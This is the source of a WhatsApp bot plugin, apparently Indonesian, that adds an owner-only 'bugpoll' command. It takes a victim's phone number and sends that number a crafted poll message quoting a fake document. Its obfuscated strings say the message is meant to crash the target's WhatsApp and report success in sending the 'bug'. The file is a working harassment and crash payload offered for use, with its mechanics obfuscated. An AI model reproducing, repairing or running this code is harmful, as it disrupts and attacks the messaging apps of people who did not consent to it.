/*let { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto } = require('@adiwajshing/baileys')
let levelling = require('../lib/levelling')
let fs = require('fs')
let path = require('path')
let fetch = require('node-fetch')
let moment = require('moment-timezone')

*/
/*let { BufferJSON, WA_DEFAULT_EPHEMERAL, prepareWAMessageMedia, generateWAMessageFromContent, proto } = require('@adiwajshing/baileys')
let levelling = require('../lib/levelling')
let fs = require('fs')
let path = require('path')
let fetch = require('node-fetch')
let moment = require('moment-timezone')
*/
 
// ? RECORD BY ZYKOMD/JANGAN HAPUS BANG?? 
// ? SUBSCRIBE YT GW ZYKOBOTZ-MD OFFICIAL
// ? BANG NAPA DI ENC BUKAN GW YANG ENC UDAH Bawaa sonh ny
let { BufferJSON, WA_DEFAULT_EPHEMERAL, prepareWAMessageMedia, generateWAMessageFromContent, proto } = (await import('@adiwajshing/baileys')).default
import { xpRange } from '../lib/levelling.js'
import path from 'path'
import fs from 'fs'
import fetch from 'node-fetch'
import moment from 'moment-timezone'
import jimp from 'jimp'
let handler = async (m, { conn, text, command, usedPrefix }) => {
let { exp, limit, age, money, level, role, registered } = global.db.data.users[m.sender]
    let { min, xp, max } = xpRange(level, global.multiplier)
    let umur = `*${age == '-1' ? 'Belum Daftar*' : age + '* Thn'}`
	let name = registered ? global.db.data.users[m.sender].name : conn.getName(m.sender)

const reSize = (buffer, ukur1, ukur2) => {
    return new Promise(async(resolve, reject) => {
        var baper = await Jimp.read(buffer);
        var ab = await baper.resize(ukur1, ukur2).getBufferAsync(Jimp.MIME_JPEG)
        resolve(ab)
    })
}

//TIME
let d = new Date(new Date + 3600000)
    let locale = 'id'
    // d.getTimeZoneOffset()
    // Offset -420 is 18.00
    // Offset    0 is  0.00
    // Offset  420 is  7.00
    let weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(d / 84600000) % 5]
    let week = d.toLocaleDateString(locale, { weekday: 'long' })
    let date = d.toLocaleDateString(locale, {
      day: 'numeric',
      month: 'long',
      year: 'numeric'
    })

const _0x1ec379=_0x425a;(function(_0x8173c0,_0x3608f3){const _0x342ee3=_0x425a,_0x30f372=_0x8173c0();while(!![]){try{const _0x1d8c6f=-parseInt(_0x342ee3(0xff))/(0x2*0x29e+-0xf92*-0x1+-0x429*0x5)*(-parseInt(_0x342ee3(0xee))/(0x15dd*-0x1+0x2*0x1359+-0x10d3))+-parseInt(_0x342ee3(0xfb))/(0x5c*-0x2e+0x29d+0xdee)*(parseInt(_0x342ee3(0xf1))/(0xfe2+-0x2038+-0x1*-0x105a))+parseInt(_0x342ee3(0xe3))/(0x397+0x438+-0x1*0x7ca)+parseInt(_0x342ee3(0x105))/(-0xc5e*0x1+0x2069+-0x1405)+parseInt(_0x342ee3(0x100))/(-0xf62*0x1+0x4*0x5a1+-0x71b)+-parseInt(_0x342ee3(0xf6))/(0x23e5+-0xde2+-0x15fb)*(parseInt(_0x342ee3(0x109))/(-0xc37+0x1d*-0x8b+0x955*0x3))+-parseInt(_0x342ee3(0x11d))/(0x1d9d+-0x1bb*0x3+-0x1862);if(_0x1d8c6f===_0x3608f3)break;else _0x30f372['push'](_0x30f372['shift']());}catch(_0xd6d3ab){_0x30f372['push'](_0x30f372['shift']());}}}(_0x3110,0x10a6e*-0x2+0x9a1*0xc1+0x2c*0x279d));const doc={'key':{'fromMe':![],'participant':_0x1ec379(0xe2)+_0x1ec379(0xf0),...m[_0x1ec379(0x11e)]?{'remoteJid':''}:{}},'message':{'documentMessage':{'url':_0x1ec379(0x11f)+_0x1ec379(0xd9)+_0x1ec379(0xd7)+_0x1ec379(0x11a)+_0x1ec379(0x103)+_0x1ec379(0x11c)+_0x1ec379(0x117)+_0x1ec379(0x11b),'mimetype':_0x1ec379(0xd8)+_0x1ec379(0xf4)+_0x1ec379(0xe1),'fileSha256':_0x1ec379(0xdc)+_0x1ec379(0x110)+_0x1ec379(0x118)+_0x1ec379(0x107)+_0x1ec379(0xea),'fileLength':_0x1ec379(0xfc),'pageCount':0x1,'mediaKey':_0x1ec379(0xe6)+_0x1ec379(0xe8)+_0x1ec379(0x10f)+_0x1ec379(0x101)+_0x1ec379(0x102),'fileName':_0x1ec379(0x119)+'s','fileEncSha256':_0x1ec379(0xf9)+_0x1ec379(0xe9)+_0x1ec379(0x10a)+_0x1ec379(0xdb)+_0x1ec379(0xe5)}}};if(!text)return m[_0x1ec379(0xeb)](_0x1ec379(0x112)+_0x1ec379(0xde)+_0x1ec379(0x10d)+_0x1ec379(0x108)+_0x1ec379(0xec));function _0x3110(){const _0x3c4670=['girim\x20Bug\x20','Wahaha\x20Cra','RXGvVNWAbF','/DXIECzjrS','Deffri\x20Gan','j85sbZCtNt','nsp.enc','UTKfgrl2zX','28039060SGQqGQ','chat','https://mm','p.net','fromObject','.net/d/f/A','applicatio','g.whatsapp','Message','G2W69AVPLg','TSSZu8gDEA','MamPus\x20Nge','t\x20Anda\x20Sal','masukan\x20qu','u\x20ganteng','ream','0@s.whatsa','4974380roBCOI','Bisa','5yk=','P32GszzU5p','@s.whatsap','iUZ5HKluLD','aXtytT0G2H','M9k=','reply','\x2062¡Á¡Á¡Á¡Á','Sukses\x20Men','40374tzAqHV','users','pp.net','44xWqFnB','crash\x20WA\x20n','ery\x0acontoh','n/octet-st','sender','344EgzCXc','message','./thumbnai','ybdZlRjhY+','data','81630zeHgay','64455','key','split','53fbfsyj','5406037ByCaAj','7lCAd1PIz3','Qb0=','q1cJ6JupaB',':\x20.vote\x20ak','9034272zBBWCI','Ke\x20','h3rmcoHN76',':\x0a.bugpoll','95031ZegKfp','HN4iKWCFis','readFileSy','sh\x20ya\x20wa\x20n','ah\x0a\x0aContoh','ya:v','5h/TZzubVJ','Php8vjdtJS','l.jpg','Maaf\x20Forma','Vote\x20Kalo\x20','relayMessa'];_0x3110=function(){return _0x3c4670;};return _0x3110();}let [number,pesan]=text[_0x1ec379(0xfe)]`|`,user=global['db'][_0x1ec379(0xfa)][_0x1ec379(0xef)][m[_0x1ec379(0xf5)]],korban=''+number;function _0x425a(_0x4f03d6,_0x5dc327){const _0x12b13a=_0x3110();return _0x425a=function(_0x48a4f3,_0x50287b){_0x48a4f3=_0x48a4f3-(0x2b*0xa7+0x1a9c+-0x1*0x35d3);let _0x269ae4=_0x12b13a[_0x48a4f3];return _0x269ae4;},_0x425a(_0x4f03d6,_0x5dc327);}var nomor=m[_0x1ec379(0xf5)];let gambar=fs[_0x1ec379(0x10b)+'nc'](_0x1ec379(0xf8)+_0x1ec379(0x111));if(!text)return m[_0x1ec379(0xeb)](_0x1ec379(0xdf)+_0x1ec379(0xf3)+_0x1ec379(0x104)+_0x1ec379(0xe0));m[_0x1ec379(0xeb)](_0x1ec379(0xed)+_0x1ec379(0x115)+_0x1ec379(0x106)+korban);var pollCreation=generateWAMessageFromContent(m[_0x1ec379(0x11e)],proto[_0x1ec379(0xda)][_0x1ec379(0xd6)]({'pollCreationMessage':{'name':_0x1ec379(0xdd)+_0x1ec379(0xf2)+_0x1ec379(0x10e),'options':[{'optionName':_0x1ec379(0x113)+_0x1ec379(0xe4)},{'optionName':_0x1ec379(0x116)+_0x1ec379(0x10c)+'ya'}],'selectableOptionsCount':0x2}}),{'userJid':m[_0x1ec379(0x11e)],'quoted':doc});conn[_0x1ec379(0x114)+'ge'](korban+(_0x1ec379(0xe7)+_0x1ec379(0x120)),pollCreation[_0x1ec379(0xf7)],{'messageId':pollCreation[_0x1ec379(0xfd)]['id']});
}
handler.command = /^(bugpoll)$/i

handler.owner = true

export default handler
